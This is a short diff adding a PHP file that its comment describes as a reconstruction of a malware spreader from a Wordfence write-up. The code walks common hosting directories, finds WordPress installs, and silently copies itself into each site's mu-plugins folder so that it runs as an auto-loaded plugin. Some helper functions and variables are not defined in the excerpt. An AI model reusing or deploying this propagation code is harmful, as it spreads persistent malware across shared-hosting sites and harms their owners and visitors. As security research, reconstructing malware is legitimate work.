@@ -1,0 +1,12 @@
+<?php
+// Reconstruction of the spreader in Wordfence's write-up (2026-09).
+function sc_spread_roots() {
+	return array('/home', '/var/www', '/var/www/vhosts', '/var/www/html', '/srv/www', '/srv/users', '/usr/local/www');
+}
+foreach (sc_find_installs(sc_spread_roots()) as $root) {
+	$dest = $root . '/wp-content/mu-plugins';
+	if (!is_dir($dest)) {
+		@mkdir($dest, 0755, true);
+	}
+	@file_put_contents($dest . '/' . $name, $self);
+}
